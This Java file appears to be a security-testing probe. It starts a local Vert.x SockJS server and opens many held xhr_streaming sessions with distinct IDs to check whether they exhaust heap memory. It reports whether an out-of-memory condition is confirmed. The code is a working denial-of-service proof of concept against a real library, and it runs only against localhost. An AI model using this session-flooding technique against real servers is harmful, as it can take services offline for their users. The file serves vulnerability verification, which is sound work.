package org.example.dos.dynamic;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import io.vertx.core.Vertx;
import io.vertx.core.shareddata.LocalMap;
import io.vertx.ext.web.Router;
import io.vertx.ext.web.handler.sockjs.SockJSHandler;
import io.vertx.ext.web.handler.sockjs.SockJSHandlerOptions;

public final class VertxSockJsSessionHttpProbe {
    private static HttpURLConnection openStreaming(int port, int index) throws Exception {
        URL url = new URL("http://127.0.0.1:" + port + "/sockjs/server/session-" + index + "/xhr_streaming");
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setConnectTimeout(5000);
        connection.setReadTimeout(1000);
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "text/plain");
        try (OutputStream out = connection.getOutputStream()) {
            out.write(new byte[0]);
        }
        connection.getResponseCode();
        return connection;
    }

    public static void main(String[] args) throws Exception {
        int requests = Integer.parseInt(args[0]);
        int payloadBytes = Integer.parseInt(args[1]);
        int progressEvery = Integer.parseInt(args[2]);
        int port = Integer.parseInt(args[3]);
        String profile = args[4];

        Vertx vertx = Vertx.vertx();
        Router router = Router.router(vertx);
        SockJSHandlerOptions options = new SockJSHandlerOptions();
        SockJSHandler sockJSHandler = SockJSHandler.create(vertx, options);
        router.route("/sockjs/*").subRouter(sockJSHandler.socketHandler(sock -> {
            // Keep sockets registered; the attacker-controlled session id is retained by SockJS.
        }));
        vertx.createHttpServer().requestHandler(router).listen(port, "127.0.0.1").toCompletionStage().toCompletableFuture().get();
        LocalMap<String, ?> sessions = vertx.sharedData().getLocalMap("_vertx.sockjssessions");

        ProbeSupport.printCommon("vertx-sockjs-session-real-http", requests, payloadBytes, port, profile);
        System.out.println("harnessMode=real_vertx_sockjs_xhr_streaming_sessions");
        System.out.println("defaultSessionTimeoutMs=5000");
        System.out.println("globalSessionCapFound=false");
        System.out.println("payloadBytesUsedForPathPadding=" + payloadBytes);
        System.out.flush();

        List<HttpURLConnection> held = new ArrayList<>();
        int i = 0;
        try {
            while (i < requests) {
                held.add(openStreaming(port, i));
                i++;
                if (i % progressEvery == 0) {
                    System.out.println("progress requests=" + i
                            + " sockJsSessions=" + sessions.size()
                            + " usedHeapBytes=" + ProbeSupport.usedHeapBytes());
                    System.out.flush();
                }
            }
            if ("oom".equals(profile)) {
                System.out.println("verdict=NOT_VERIFIED_TIMEOUT_BOUNDED");
                System.out.println("requestsCompleted=" + i);
                System.out.println("sockJsSessions=" + sessions.size());
                System.out.println("notes=real HTTP SockJS session IDs retained only within connection/timeout window; no heap OOM reached");
            } else {
                System.out.println("verdict=COMPLETED");
                System.out.println("requestsCompleted=" + i);
                System.out.println("sockJsSessions=" + sessions.size());
            }
        } catch (OutOfMemoryError oom) {
            System.out.println("verdict=CONFIRMED_HEAP_OOM_REAL_HTTP");
            System.out.println("requestsBeforeOom=" + i);
            System.out.println("sockJsSessionsBeforeOom=" + sessions.size());
            System.out.println("oomSignal=main_thread");
            System.out.println("usedHeapBytesAtOom=" + ProbeSupport.usedHeapBytes());
            System.out.flush();
            System.exit(ProbeSupport.OOM_EXIT_CODE);
        } finally {
            for (HttpURLConnection connection : held) {
                connection.disconnect();
            }
            ProbeSupport.http("GET", "http://127.0.0.1:" + port + "/sockjs/info", Map.of(), new byte[0]);
            vertx.close().toCompletionStage().toCompletableFuture().get();
        }
    }
}
